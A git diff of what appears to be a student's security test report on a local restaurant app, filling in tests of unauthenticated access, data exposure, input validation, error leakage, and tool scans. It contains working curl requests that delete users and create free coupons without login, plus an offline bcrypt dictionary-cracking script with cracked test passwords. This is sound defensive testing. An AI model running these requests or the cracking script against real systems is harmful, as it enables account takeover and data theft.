@@ -4,7 +4,7 @@
 
 **How to read it.** Every step starts with its result in one line. The details come after. You can read any step on its own.
 
-**Status:** steps 1 to 3 of 9 done (9 November 2026).
+**Status:** steps 1 to 8 of 9 done (9 November 2026).
 
 ---
 
@@ -103,11 +103,11 @@ How to report a problem in this project will be described in `SECURITY.md` (plan
 | 1 | **Recon.** List everything that can be reached. | INFO, CONF | Done |
 | 2 | **Normal use.** Use the app like a real user and look at what it sends back. | - | Done |
 | 3 | **Login and token.** Login messages, password guessing, the token itself. | IDNT, ATHN, SESS, CRYP | Done |
-| 4 | **Permissions.** Every route without a token, with a bad token, with a fake token. | ATHZ | To do |
-| 5 | **Data exposure.** What do answers contain that they should not? | ATHZ, ERRH | To do |
-| 6 | **Input and business logic.** Extra fields, wrong IDs, a 100% coupon. | INPV, BUSL | To do |
-| 7 | **Errors, logs, overload.** Error codes, what lands in the logs, heavy load. | ERRH | To do |
-| 8 | **Tools.** `npm audit` and Semgrep, to catch what I missed. | - | To do |
+| 4 | **Permissions.** Every route without a token, with a bad token, with a fake token. | ATHZ | Done |
+| 5 | **Data exposure.** What do answers contain that they should not? | ATHZ, ERRH | Done |
+| 6 | **Input and business logic.** Extra fields, wrong IDs, a 100% coupon. | INPV, BUSL | Done |
+| 7 | **Errors, logs, overload.** Error codes, what lands in the logs, heavy load. | ERRH | Done |
+| 8 | **Tools.** `npm audit` and Semgrep, to catch what I missed. | - | Done |
 | 9 | **Report.** Final findings table and fixes. | - | To do |
 
 ---
@@ -571,7 +571,7 @@ So the "example" is most likely the old real development config, copied instead 
 | --- | --- |
 | `SECRET` | Yes: `MySecret1!`, the one used in this test |
 | `MONGODB_URI` | **Contains a username and password**, for a MongoDB on `localhost`. Low risk (someone's own laptop), but a real credential in public history. Not repeated here. |
-| `CLOUD_NAME`, `CLOUD_API_KEY`, `CLOUD_API_SECRET` | No: all three are the same placeholder word |
+| `CLOUD_NAME`, `CLOUD_API_KEY`, `CLOUD_API_SECRET` | No: all three are the same placeholder word in this file. **But** real-looking Cloudinary keys were in another file, found later by gitleaks (test 8c, F20). |
 
 (Finding F10.) Fix: change any secret that was ever pushed (rewriting history does not help once others have copies), and scan every commit for secrets in the pipeline, for example with gitleaks.
 
@@ -592,33 +592,586 @@ So the "example" is most likely the old real development config, copied instead 
 
 ## Step 4: Permissions
 
-**Goal:** call every route from the route list without a token, with a broken token, and with a fake token.
+**Goal:** call the routes from the route list (step 1) as a stranger, without any token, and see what the app lets me do.
 
-*To do.*
+| Test | Question | WSTG | Result |
+| --- | --- | --- | --- |
+| 4a | What can a stranger read? | ATHZ | **Everything**, including every user's password hash (F11, F12) |
+| 4b | What can a stranger change or delete? | ATHZ | **Everything**: a free coupon, a deleted user (F13, F14) |
+| 4c | Does the frontend send the token to items and discounts? | ATHZ | **No**: adding token checks will break the admin pages (note for the fix) |
+
+### Test 4a: what can a stranger read?
+
+**Result:** everything. All 6 "read" routes answer without a token. The user list gives every user's password hash, email, address, phone and role. (Findings F11 and F12.)
+
+**Why it matters.** This is the worst finding so far: one request, no login, and a stranger has every user's personal data plus their password hashes. With weak passwords allowed (F5), many hashes can be turned back into passwords on the attacker's own computer, with no rate limit.
+
+**What I did**
+
+1. Opened the user list in a private (incognito) browser window. A private window has no stored token, and typing a URL never sends one.
+
+![User list in an incognito window, no login: password hashes and personal data](evidence/04-users-list-no-login.png)
+
+2. Called every "read" route without a token:
+
+```bash
+for path in /api/auth/users /api/items/items /api/items/dietary /api/items/orders \
+            /api/discounts/coupons /api/discounts/campaign; do
+  curl -s -o /dev/null -w "$path HTTP %{http_code}\n" "http://localhost$path"
+done
+```
+
+```text
+/api/auth/users            HTTP 200
+/api/items/items           HTTP 200
+/api/items/dietary         HTTP 200
+/api/items/orders          HTTP 200
+/api/discounts/coupons     HTTP 200
+/api/discounts/campaign    HTTP 200
+```
+
+3. Listed what the user list gives away, one line per user:
+
+```bash
+curl -s http://localhost/api/auth/users | jq -c '.[] | {email, role, password, address, phoneNumber}'
+```
+
+```text
+{"email":"gordon@example.com","role":"admin","password":"$2b$10$Z/jbrrT8yjP6byuG297iPOwTBBul.lki4bhlJICGngFvpELpQx65W","address":"42 Overcooked Lane, Soggy Bottom","phoneNumber":"\t555-NO-SALT"}
+{"email":"weak-Abcde1@example.com","role":"admin","password":"$2b$10$sWbZ3qr8ccCnC2dsKVK1T.imGYvX0Hv9xbne.Pu69AR2KbRB6LCO6","address":"1 Easy Street","phoneNumber":"1"}
+{"email":"weak-Password1@example.com","role":"admin","password":"$2b$10$cUT/HKcQ6WvUFlKIZjC2PegMyheWkrIWAixdCLJL.6eqcF7dAcrUS","address":"1 Easy Street","phoneNumber":"1"}
+{"email":"weak-Qwerty123@example.com","role":"admin","password":"$2b$10$2tSDE6OYtNx9qisevKjTIutyHQS23XYFGilEbzmDjTz/oTqNtqI.y","address":"1 Easy Street","phoneNumber":"1"}
+{"email":"weak-Restauranty1@example.com","role":"admin","password":"$2b$10$.uFp4DyxoqgKtserF7N7UODUNjgpQdmIlk62CQD4vcHHunVY8izf2","address":"1 Easy Street","phoneNumber":"1"}
+```
+
+4. Tried to turn the hashes back into passwords, offline. A tiny word list of 15 common passwords, checked against each downloaded hash with the bcrypt library already in `backend/auth`:
+
+```bash
+cd backend/auth
+curl -s http://localhost/api/auth/users | node -e '
+  const bcrypt = require("bcryptjs");
+  const users = JSON.parse(require("fs").readFileSync(0, "utf8"));
+  const words = ["123456","password","Password1","Password123","Qwerty123","Abc123","Abcde1",
+                 "Welcome1","Letmein1","Admin123","Summer2026","Winter2026",
+                 "Restaurant1","Restauranty1","Restauranty2026"];
+  for (const u of users) {
+    const hit = words.find(w => bcrypt.compareSync(w, u.password));
+    console.log(u.email.padEnd(32), hit ? "CRACKED: " + hit : "not in list");
+  }
+'
+```
+
+```text
+gordon@example.com               not in list
+weak-Abcde1@example.com          CRACKED: Abcde1
+weak-Password1@example.com       CRACKED: Password1
+weak-Qwerty123@example.com       CRACKED: Qwerty123
+weak-Restauranty1@example.com    CRACKED: Restauranty1
+done in 3.4 s, offline, no rate limit
+```
+
+**How the cracking works.** A hash cannot be turned back into the password. So the script guesses: for each user and each word in the list, it
+
+1. takes a guess, for example `Password1`,
+2. hashes it the same way the server did, with that user's salt and cost,
+3. compares the result with the stolen hash. Same result: the guess is the password. Different: next guess.
+
+Everything needed for step 2 is written inside the stolen hash:
+
+```text
+$2b$10$sWbZ3qr8ccCnC2dsKVK1T.imGYvX0Hv9xbne.Pu69AR2KbRB6LCO6
+ 2b                                   -> algorithm: bcrypt
+    10                                -> cost: hashing repeated 2^10 = 1024 times, so each guess is slow
+       sWbZ3qr8ccCnC2dsKVK1T.         -> salt: random, different for every user, not secret
+                             imGYv... -> the hash result to compare against
+```
+
+`bcrypt.compareSync(guess, hash)` does steps 2 and 3. It is the same function the server uses at login (`auth.routes.js`). So the script runs the server's own password check on the attacker's laptop, as often as it likes. The server never sees a single attempt. This is called a **dictionary attack**.
+
+**What the salt and cost do.** The salt makes every user's hash different, even for the same password, so each user must be guessed separately, and precomputed tables of hashes are useless. The cost makes each guess slow: about 50 ms here. That is nothing for one real login, but a lot for millions of guesses. Neither stops guessing; only a password that is not in any list does.
+
+**4 of 5 passwords recovered in 3.4 seconds**, on a laptop, with a simple script. The login rate limit (F6) does not help here: the guessing happens on the attacker's computer, not on the login page. Real attackers use word lists with millions of entries and graphics cards that are hundreds of times faster than this script.
+
+Gordon's password (`RawChicken1`) survived because it is not in any common list. Bcrypt makes each guess slow, but only an unusual password makes guessing hopeless. This is why F5 (weak passwords allowed) and F11 (hashes leaked) together are worse than each alone.
+
+5. Logged in with a cracked password:
+
+```bash
+curl -s -w '\nHTTP %{http_code}\n' -X POST http://localhost/api/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"weak-Password1@example.com","password":"Password1"}' | cut -c1-80
+```
+
+```text
+{"authToken":"eyJhbGci...   (token shortened in this document)
+HTTP 200
+```
+
+**The whole attack chain, from nothing to admin.** Each step needs only what the step before gave:
+
+| # | The attacker | Needs | Gets | Finding |
+| --- | --- | --- | --- | --- |
+| 1 | Opens `/api/auth/users` | Nothing, no login | Every user's email and password hash | F11 |
+| 2 | Guesses the hashes offline | The hashes | The passwords of the weak accounts | F5 |
+| 3 | Logs in with a cracked password | Email and password | A valid token | - |
+| 4 | Uses the app | The token | Admin rights, because every account is admin | F1 |
+
+Fixing any one link breaks this chain. Fixing several is safer: if one fix fails, the others still hold.
+
+**Not in the brief.** The project brief asks to add token checks to discounts and items. The user list is in **auth**, so following the brief alone would leave the worst leak open.
+
+**Secure answer:** `401` without a token for every route that is not meant to be public. The user list should not exist as a public route at all, and no answer should ever contain the `password` field.
+
+### Test 4b: what can a stranger change or delete?
+
+**Result:** everything. Without a token I created a 100% discount coupon valid until 2099, and deleted a user. The delete answer also contained the deleted user's password hash and personal data. (Findings F13 and F14.)
+
+**Why it matters.** Reading data is bad; changing it is worse. Anyone on the internet can give themselves free food, delete customers, or wipe the menu. And nobody can tell who did it: there is no login, so the logs show no user.
+
+**What I did**
+
+1. Created a coupon with a 100% discount, without a token. The name shows the discount, because the admin page lists only the name and the dates.
+
+```bash
+curl -s -w '\nHTTP %{http_code}\n' -X POST http://localhost/api/discounts/coupons \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"FREE-LUNCH-100","discount":"100","start":"2026-11-09","end":"2099-12-31"}'
+```
+
+```text
+{"_id":"6af1dccdca9a3648505077db","name":"FREE-LUNCH-100","discount":"100","start":"2026-11-09","end":"2099-12-31","createdAt":"2026-11-09T14:46:37.305Z","updatedAt":"2026-11-09T14:46:37.305Z","__v":0}
+HTTP 200
+```
+
+The stranger's coupon now appears in the admin's coupon list:
+
+![The coupon created without a token, shown in the admin's coupon page](evidence/04-free-coupon-in-admin-page.png)
+
+2. Deleted a user, without a token, then counted the users:
+
+```bash
+ID=$(curl -s http://localhost/api/auth/users | jq -r '.[] | select(.email=="weak-Abcde1@example.com") | ._id')
+curl -s -w '\nHTTP %{http_code}\n' -X DELETE http://localhost/api/auth/users/$ID
+curl -s http://localhost/api/auth/users | jq length
+```
+
+```text
+{"message":"User Eliminado","userDeleted":{"_id":"6af1ce6e64e1c2ecab40c04d","name":"Weak","surname":"Pw","password":"$2b$10$sWbZ3qr8ccCnC2dsKVK1T.imGYvX0Hv9xbne.Pu69AR2KbRB6LCO6","orderHistory":[],"role":"admin","email":"weak-Abcde1@example.com","address":"1 Easy Street","phoneNumber":"1","__v":0}}
+HTTP 200
+4
+```
+
+5 users before, 4 after. The answer to the delete includes the deleted user's password hash: one more route that returns `password`.
+
+**Secure answer:** `401` without a token. Deleting users should need an admin token, and the answer should not contain the deleted record.
+
+### Test 4c: does the frontend send the token to items and discounts?
+
+**Result:** no. Only the login code sends the token. All 23 calls in the admin pages go to items and discounts without it. This is not a vulnerability, but it matters for the fix: once items and discounts check tokens, every admin page would get `401` and stop working.
+
+**What I did:** read the frontend code (faster and more complete than clicking every page).
+
+Only `client/src/services/auth.service.js` adds the token. An *interceptor* runs before each of its requests and sets the header:
+
+```js
+this.api.interceptors.request.use((config) => {
+  const storedToken = localStorage.getItem("authToken");
+  if (storedToken) {
+    config.headers = { Authorization: `Bearer ${storedToken}` };
+  }
+  return config;
+});
+```
+
+The admin pages use plain `axios` instead, for example `CouponsPageList.jsx`:
+
+```js
+axios.get(`${url}/api/discounts/coupons`)
+```
+
+```bash
+grep -rn "axios" client/src/pages          # 23 calls, all plain axios
+grep -rln "Authorization" client/src       # only services/ and context/, never pages/
+```
+
+**For the fix (issue #9).** Adding token checks to items and discounts needs a frontend change too: the admin pages must send the token, for example through one shared axios client with the same interceptor.
 
 ## Step 5: Data exposure
 
 **Goal:** check every answer for data that should not be there: password hashes, other people's personal data, internal details.
 
-*To do.*
+Already found in step 4: the user list (test 4a) and the answer to deleting a user (test 4b) contain password hashes.
+
+| Test | Question | Result |
+| --- | --- | --- |
+| 5a | Does a logged-in user also get other users' hashes? | **Yes** (F15) |
+| 5b | Does looking up one user leak the hash? | **Yes**, without a token (added to F11) |
+| 5c | Does the signup answer leak the password or hash? | **No**: clean (control test) |
+
+### Test 5a: does a logged-in user also get other users' hashes?
+
+**Result:** yes. Logged in as a normal user, I still got every user's password hash, including my own. (Finding F15.)
+
+**Why it matters.** Anyone can sign up and get a token in seconds, so "logged in" protects nothing here. A token check on this route would not help. Blocking the whole path at the Gateway (planned) hides it from the internet, but the auth service itself still sends the hashes to anyone who reaches it another way: another pod in the cluster, or a new route added later. The hashes must never leave the auth service, whoever asks.
+
+**What I did:** logged in as one of the cracked test accounts, then called the user list with that token.
+
+```bash
+T=$(curl -s -X POST http://localhost/api/auth/login -H 'Content-Type: application/json' \
+  -d '{"email":"weak-Password1@example.com","password":"Password1"}' | jq -r .authToken)
+curl -s http://localhost/api/auth/users -H "Authorization: Bearer $T" | jq -c '.[] | {email, password}'
+```
+
+```text
+{"email":"gordon@example.com","password":"$2b$10$Z/jbrrT8yjP6byuG297iPOwTBBul.lki4bhlJICGngFvpELpQx65W"}
+{"email":"weak-Password1@example.com","password":"$2b$10$cUT/HKcQ6WvUFlKIZjC2PegMyheWkrIWAixdCLJL.6eqcF7dAcrUS"}
+{"email":"weak-Qwerty123@example.com","password":"$2b$10$2tSDE6OYtNx9qisevKjTIutyHQS23XYFGilEbzmDjTz/oTqNtqI.y"}
+{"email":"weak-Restauranty1@example.com","password":"$2b$10$.uFp4DyxoqgKtserF7N7UODUNjgpQdmIlk62CQD4vcHHunVY8izf2"}
+{"email":"ada@example.com","password":"$2b$10$cBQOAB85vx8smG.jUDYvvumzhsoQYi77whoppdnc2AJj30GJ6WsBC"}
+```
+
+**Why.** The route sends the raw database records (`res.json(users)` in `backend/auth/routes/users.routes.js`), and the User model has no rule to leave the `password` field out.
+
+**Secure answer:** no `password` field in any answer. The safest fix is in the User model, so that every route, including future ones, leaves it out (issue #21).
+
+### Test 5b: does looking up one user leak the hash?
+
+**Result:** yes. Asking for one user by ID, without a token, returns the full record with the password hash. Same cause as the user list, so it is part of finding F11.
+
+**What I did**
+
+```bash
+GID=$(curl -s http://localhost/api/auth/users | jq -r '.[] | select(.email=="gordon@example.com") | ._id')
+curl -s -w '\nHTTP %{http_code}\n' http://localhost/api/auth/users/$GID
+```
+
+```text
+{"_id":"6af1c528e76ced969e1a2240","name":"Gordon","surname":"Ramsoftware","password":"$2b$10$Z/jbrrT8yjP6byuG297iPOwTBBul.lki4bhlJICGngFvpELpQx65W","orderHistory":[],"role":"admin","email":"gordon@example.com","address":"42 Overcooked Lane, Soggy Bottom","phoneNumber":"\t555-NO-SALT","__v":0}
+HTTP 200
+```
+
+**So far, three answers contain password hashes:** the user list (4a, 5a), one user by ID (5b), and the answer to deleting a user (4b). All three send the raw database record.
+
+### Test 5c: does the signup answer leak the password or hash?
+
+**Result:** no. The answer contains only safe fields. This was a control test: I expected it to be clean.
+
+```bash
+curl -s -w '\nHTTP %{http_code}\n' -X POST http://localhost/api/auth/signup -H 'Content-Type: application/json' \
+  -d '{"name":"Ada","surname":"Leak","email":"ada2@example.com","password":"Ada12345","address":"7 Byte Road","phoneNumber":"555"}'
+```
+
+```text
+{"user":{"email":"ada2@example.com","name":"Ada","surname":"Leak","address":"7 Byte Road","phoneNumber":"555","_id":"6af1e04964e1c2ecab40c0ec"}}
+HTTP 201
+```
+
+**Why it is clean.** The signup code builds its answer by hand and copies only safe fields:
+
+```js
+const { email, name, surname, address, phoneNumber, _id } = createdUser;
+res.status(201).json({ user: { email, name, surname, address, phoneNumber, _id } });
+```
+
+**The pattern across step 5:** answers built by hand are safe; answers that send the raw database record leak the hash. So the fix belongs in one place, the User model, not in each route.
 
 ## Step 6: Input and business logic
 
-**Goal:** send what the app does not expect (extra fields, wrong IDs, missing fields) and abuse business rules (a 100% coupon).
+**Goal:** send what the app does not expect (extra fields, wrong values, impossible dates) and abuse business rules.
 
-*To do.*
+| Test | Question | WSTG | Result |
+| --- | --- | --- | --- |
+| 6a | Does the app check what a discount can be? | BUSL, INPV | **No**: -50%, 1000% and "lots" accepted (F16) |
+| 6b | Can I set fields I should not, like my role? | INPV | **No** at signup: extra fields are ignored (control test) |
+
+### Test 6a: does the app check what a discount can be?
+
+**Result:** no. A coupon accepts a discount of -50, 1000 or the word "lots", and an end date before its start date. Only an empty discount is refused. (Finding F16.)
+
+**Why it matters.** A discount is a business rule: a number from 0 to 100. The app stores it as free text (`discount: { type: String }` in `coupons.model.js`) and never checks it. Depending on how a checkout uses the number, 1000% could mean the restaurant pays the customer, and -50% could charge customers extra. No scanner finds this: only someone who knows the business rule does.
+
+**What I did:** created four coupons with bad discounts. Each one also ends the day before it starts.
+
+```bash
+for d in "-50" "1000" "lots" ""; do
+  curl -s -o /dev/null -w "discount=\"$d\" HTTP %{http_code}\n" -X POST http://localhost/api/discounts/coupons \
+    -H 'Content-Type: application/json' \
+    -d "{\"name\":\"TEST-$d\",\"discount\":\"$d\",\"start\":\"2026-11-09\",\"end\":\"2026-11-08\"}"
+done
+```
+
+```text
+discount="-50"  HTTP 200
+discount="1000" HTTP 200
+discount="lots" HTTP 200
+discount=""     HTTP 400
+```
+
+The empty value fails only because the field is `required`. Nothing checks that it is a number, its range, or the dates.
+
+**Secure answer:** `400` for all four. The discount is a number from 0 to 100, and the end date comes after the start date. These checks must run in the backend: an attacker does not use the frontend form.
+
+### Test 6b: can I set fields I should not, like my role?
+
+**Result:** no, not at signup. I sent `"role": "superadmin"` and it was ignored. This was a control test.
+
+**Why it matters.** This attack is called **mass assignment**: the code saves the whole request into the database, so the caller can add fields the form does not have,  like `"role": "superadmin"`. Today every account is admin anyway (F1). But the fix for F1 will make new accounts `user`, and this test shows an attacker cannot undo that fix by sending `"role": "admin"`.
+
+**What I did**
+
+```bash
+curl -s -X POST http://localhost/api/auth/signup -H 'Content-Type: application/json' \
+  -d '{"name":"Mass","surname":"Assign","email":"mass@example.com","password":"Mass12345","address":"1 Extra Field Road","phoneNumber":"555","role":"superadmin"}'
+curl -s http://localhost/api/auth/users | jq -c '.[] | select(.email=="mass@example.com") | {email, role}'
+```
+
+```text
+{"user":{"email":"mass@example.com","name":"Mass","surname":"Assign","address":"1 Extra Field Road","phoneNumber":"555","_id":"6af1e0e964e1c2ecab40c0f1"}}
+{"email":"mass@example.com","role":"admin"}
+```
+
+The stored role is the default, `admin`, not `superadmin`.
+
+**Why it is safe.** Signup copies only the fields it expects: `const { name, surname, email, password, address, phoneNumber } = req.body`.
+
+**Not safe everywhere.** The coupon, campaign, item and dietary routes save the request body as it is (for example `Coupons.create(req.body)` in `coupons.routes.js`). The database schema drops unknown fields, but a caller can set any known field. For items this includes `views` and `ordered`, so anyone could fake how popular a dish is. Read from the code; not tested with a request, because creating an item needs an image upload to Cloudinary.
 
 ## Step 7: Errors, logs, overload
 
 **Goal:** check error codes, what ends up in the logs, and what heavy load does.
 
-*To do.*
+Already found: personal data in the logs (F3, step 2) and a tampered token answered with 500 (F8, test 3e).
+
+| Test | Question | WSTG | Result |
+| --- | --- | --- | --- |
+| 7a | What happens with no token, or a broken one? | ERRH | **500**, and 11 to 17 log lines each (added to F8) |
+| 7b | What do errors tell an attacker? | ERRH | **Internals**: database, library, model and field names (F17) |
+| 7c | Can junk requests fill up the monitoring? | - | **Yes**: 200 junk URLs made 201 new counters (F18) |
+
+### Test 7a: what happens with no token, or a broken one?
+
+**Result:** both get "500 server error" instead of "401 not allowed", like the tampered token in test 3e. Each refused request writes 11 to 17 lines of error and stack trace to the log. A normal request writes 1 line. (Part of finding F8.)
+
+**Why it matters**
+
+| Problem | Effect |
+| --- | --- |
+| Attacks are answered with 500 | The planned "5xx rate" alert fires during every attack. Real outages and real attacks look the same, and people learn to ignore the alert. |
+| 11 to 17 log lines per refused request | 10,000 bad tokens (a small k6 run) write over 100,000 log lines. Logs cost storage, become hard to search, and can be flooded on purpose. |
+
+**What I did**
+
+```bash
+curl -s -w '\nHTTP %{http_code}\n' http://localhost/api/auth/verify
+curl -s -w '\nHTTP %{http_code}\n' http://localhost/api/auth/verify -H 'Authorization: Bearer not.a.token'
+```
+
+```text
+{"message":"Internal server error. Check the server console"}
+HTTP 500
+{"message":"Internal server error. Check the server console"}
+HTTP 500
+```
+
+The auth service's log for the request without a token (11 lines for one request):
+
+```text
+ERROR GET /api/auth/verify UnauthorizedError: No authorization token was found
+    at new UnauthorizedError (.../express-jwt/dist/errors/UnauthorizedError.js:22:28)
+    at .../express-jwt/dist/index.js:115:39
+    at step (.../express-jwt/dist/index.js:33:23)
+    at Object.next (.../express-jwt/dist/index.js:14:53)
+    at fulfilled (.../express-jwt/dist/index.js:5:58)
+    at process.processTicksAndRejections (node:internal/process/task_queues:105:5) {
+  code: 'credentials_required',
+  status: 401,
+  inner: { message: 'No authorization token was found' }
+}
+GET /api/auth/verify 500 95.720 ms - 61
+```
+
+The garbage token gives the same, plus a second stack trace (17 lines). Again the error itself says `status: 401`, and the app's error handler turns it into 500.
+
+**Secure answer:** `401`, and one short log line such as `401 GET /api/auth/verify: no token`.
+
+### Test 7b: what do errors tell an attacker?
+
+**Result:** error answers contain the raw database error: the database type, the library, the model name, and the fields with their rules. (Finding F17.)
+
+**Why it matters.** None of this is an attack by itself. But it tells an attacker exactly what is behind the API (MongoDB with Mongoose) and what the data looks like, so they know which attacks to try next, for example NoSQL injection.
+
+**What I did:** asked for an item with an ID that is not a valid ID, and created a dietary category with a missing field.
+
+```bash
+curl -s -w '\nHTTP %{http_code}\n' http://localhost/api/items/items/hello
+curl -s -w '\nHTTP %{http_code}\n' -X POST http://localhost/api/items/dietary \
+  -H 'Content-Type: application/json' -d '{"name":"only-a-name"}'
+```
+
+```text
+{"stringValue":"\"hello\"","valueType":"string","kind":"ObjectId","value":"hello","path":"_id","reason":{},"name":"CastError","message":"Cast to ObjectId failed for value \"hello\" (type string) at path \"_id\" for model \"Item\""}
+HTTP 400
+{"errors":{"description":{"name":"ValidatorError","message":"Path `description` is required.","properties":{"message":"Path `description` is required.","type":"required","path":"description"},"kind":"required","path":"description"}},"_message":"Dietary validation failed","name":"ValidationError","message":"Dietary validation failed: description: Path `description` is required."}
+HTTP 400
+```
+
+| Detail in the answer | What it tells an attacker |
+| --- | --- |
+| `ObjectId` | The database is MongoDB |
+| `CastError`, `ValidatorError` | The code uses the Mongoose library |
+| `for model "Item"`, `Dietary validation failed` | The names of the data models |
+| `path`, `required` | The field names and their rules |
+
+**Why.** The routes end with `.catch(err => res.status(400).json(err))`, which sends the whole error object to the caller. This line appears 32 times in 7 route files.
+
+**Secure answer:** a short message such as `{"message":"Invalid id"}`, and the details only in the server log. One shared error handler fixes all 32 places.
+
+### Test 7c: can junk requests fill up the monitoring?
+
+**Result:** yes. 200 requests to made-up URLs created 201 new counters in the items service's metrics, one per URL. (Finding F18.)
+
+**Why it matters.** Each service counts requests for Prometheus (`/metrics`), labelled with the full URL of the request (`req.originalUrl` in `metrics.cjs`). Prometheus keeps every different label as its own "time series" in memory. Normal use makes a few dozen. An attacker sending millions of random URLs makes millions, until Prometheus becomes slow or crashes. Then the dashboards and alerts stop working, exactly during the attack. This problem is called **high cardinality**.
+
+It also hurts normal monitoring: every item ID shows up as its own "route", so a "requests per route" graph becomes unreadable.
+
+**What I did:** counted the request counters, sent 200 requests to random URLs through HAProxy (like an attacker), and counted again. `/metrics` is read directly on port 3003, as Prometheus would.
+
+```bash
+before=$(curl -s localhost:3003/metrics | grep -c '^http_requests_total')
+for i in $(seq 1 200); do
+  curl -s -o /dev/null "http://localhost/api/items/items/junk-$RANDOM$RANDOM"
+done
+after=$(curl -s localhost:3003/metrics | grep -c '^http_requests_total')
+echo "Counters before: $before, after: $after"
+curl -s localhost:3003/metrics | grep '^http_requests_total' | grep junk | head -3
+```
+
+```text
+Counters before: 6, after: 207
+http_requests_total{method="GET",route="/api/items/items/junk-83044843",statusCode="400"} 1
+http_requests_total{method="GET",route="/api/items/items/junk-1971613138",statusCode="400"} 1
+http_requests_total{method="GET",route="/api/items/items/junk-2014412071",statusCode="400"} 1
+```
+
+**Secure answer:** label by the route pattern (`/api/items/items/:id`, from `req.route.path`), not by the full URL. Unknown URLs get one shared label such as `unmatched`. Then 200 junk requests add one or two counters, not 200.
+
+**Not tested here:** many logins at once slowing down the whole auth service (bcrypt runs synchronously and blocks Node's only thread). This is part of the planned k6 load test.
 
 ## Step 8: Tools
 
-**Goal:** run `npm audit` (known vulnerable packages) and Semgrep (risky code patterns) to catch what manual testing missed.
+**Goal:** run security tools to catch what manual testing missed, and see how many of the manual findings the tools find on their own.
 
-*To do.*
+| Test | Tool | Looks for | Result |
+| --- | --- | --- | --- |
+| 8a | `npm audit` | Packages with known vulnerabilities | Nothing serious in production code (F19). **0 of the manual findings.** |
+| 8b | Semgrep | Risky code patterns | 3 results, all false positives. **0 of the manual findings.** |
+| 8c | gitleaks | Secrets in the git history | **Found real-looking Cloudinary keys in the first commit (F20)**, missed F10 |
+
+### Test 8a: npm audit, known vulnerable packages
+
+**Result:** no critical issues. The backends' warnings come only from a development tool that production does not need. The frontend's warnings are almost all in build tools that never reach the browser. npm audit found none of the 18 manual findings. (Finding F19.)
+
+**What I did**
+
+```bash
+for d in backend/auth backend/discounts backend/items client; do
+  (cd $d && npm audit)
+  (cd $d && npm audit --omit=dev)   # production packages only
+done
+```
+
+| Where | All packages | Production only | Comes from |
+| --- | --- | --- | --- |
+| auth, discounts, items | 2 moderate each | **0** | `nodemon`, a development tool that restarts the server when files change |
+| client | 36: 0 critical, 13 high, 7 moderate, 16 low | almost all are build tools | `react-scripts` (webpack-dev-server, svgo, postcss, workbox): they run while building, on the developer's machine |
+| client, shipped to the browser | `react-router` 6.30.6: 2 moderate | yes | One is about server-side rendering (not used here). One is an open redirect when links are built from user input (links here are fixed). Fix: version 7.18 or newer, a major upgrade. |
+
+**How to read this.** npm audit compares package versions with a public list of known vulnerabilities. It does not read our code, so it cannot see an open route or a public secret. That is why it found none of the manual findings: they are all in this app's own code and configuration.
+
+**What follows for the build:**
+
+- Run the backends with `node server.js`, not `nodemon`, and install with `npm ci --omit=dev`. Then the backend images have 0 known issues.
+- Serve the frontend as built static files, not with the development server. Then the 13 high issues in build tools never run in production.
+- Create React App (`react-scripts`) is no longer maintained. Moving to a maintained build tool such as Vite would remove most of the frontend warnings. Not this week.
+
+### Test 8b: Semgrep, risky code patterns
+
+**Result:** 3 results, all the same rule, and all false positives in this app. Semgrep found none of the 19 manual findings.
+
+**What I did:** ran Semgrep in Docker with its standard rules and its rules for secrets.
+
+```bash
+docker run --rm -v "$PWD:/src" semgrep/semgrep \
+  semgrep scan --config p/default --config p/secrets --metrics=off \
+  /src/backend /src/client/src
+```
+
+```text
+┌─────────────────┐
+│ 3 Code Findings │
+└─────────────────┘
+
+    /src/backend/auth/app.js
+     ❱ javascript.express.security.audit.express-check-csurf-middleware-usage
+          ❰❰ Blocking ❱❱
+          A CSRF middleware was not detected in your express application.
+           14┆ const app = express();
+```
+
+(The same for `backend/discounts/app.js` and `backend/items/app.js`.)
+
+**Why it is a false positive here.** CSRF (cross-site request forgery) means: a malicious website makes the user's browser send a request to this app, and the browser automatically attaches the user's login cookie. That attack needs a login based on cookies. Restauranty does not use cookies to log in: the token is in Local Storage, and the app's own JavaScript puts it in the `Authorization` header. A foreign website cannot read Local Storage, so it cannot attach the token. Semgrep only sees "Express without CSRF middleware"; it cannot know how the login works.
+
+**What Semgrep did not find:** the open routes, the public secret, the password hashes in answers, CORS `*`, the raw errors, the metrics labels. These need knowledge of what the app is supposed to do.
+
+**For the pipeline (issue #13).** This rule is marked "Blocking", so it would fail every pipeline run. The pipeline config should turn this one rule off, with the reason written next to it, instead of switching Semgrep off or ignoring its results.
+
+**Double-checked** with six rule sets (`p/default`, `p/secrets`, `p/javascript`, `p/nodejs`, `p/jwt`, `p/owasp-top-ten`) over 102 files: the same 3 results, nothing else.
+
+### Test 8c: gitleaks, secrets in the git history
+
+**Result:** gitleaks found Cloudinary credentials written directly into the code in the very first commit. They look real. I had missed them by hand. It did not find the old `.env` file from finding F10. (Finding F20.)
+
+**What I did:** scanned every commit with gitleaks in Docker. `--redact` hides the secret values in the output.
+
+```bash
+docker run --rm -u "$(id -u):$(id -g)" -v "$PWD:/repo" zricethezav/gitleaks:latest \
+  git /repo --redact --no-banner -v
+```
+
+```text
+Finding:     api_secret: "REDACTED"
+RuleID:      generic-api-key
+File:        backend/items/config/cloudinary.config.js
+Line:        9
+Commit:      6b078979a0a0bd185dd3e88c3bced020dea3f02e
+Date:        2025-04-10T07:14:14Z
+...
+INF 19 commits scanned.
+WRN leaks found: 4
+```
+
+| Result | What it is | Real? |
+| --- | --- | --- |
+| 3 × `api_secret` in `backend/*/config/cloudinary.config.js`, commit `6b07897` (April 2025) | Cloudinary credentials written into the code. Removed in June 2025 (`f24aff8`), still in the history. | **Looks real** (see below) |
+| 1 × `authToken` in `docs/evidence/before.md` | A test token in an old evidence file on a local branch that was never pushed | Harmless test data |
+
+**Why the Cloudinary keys look real.** I checked their shape without printing them: the key is a 15-digit number, the secret is 27 characters long, the cloud name is 9 characters. This is exactly the shape of real Cloudinary credentials, not a placeholder like `cloudinaryapikey`.
+
+**Why it matters.** Whoever owns that Cloudinary account has had their keys public since April 2025. Anyone can use them to upload, replace or delete images in that account.
+
+**What I did not do: try the keys.** Using someone else's leaked credentials is unauthorised access, even "just to check". The right step is to tell the owner (the original developers or the course instructor) so they can rotate the keys. This is coordinated disclosure in practice.
+
+**Tool and human found different things:**
+
+| Leak | Found by hand (test 3f) | Found by gitleaks |
+| --- | --- | --- |
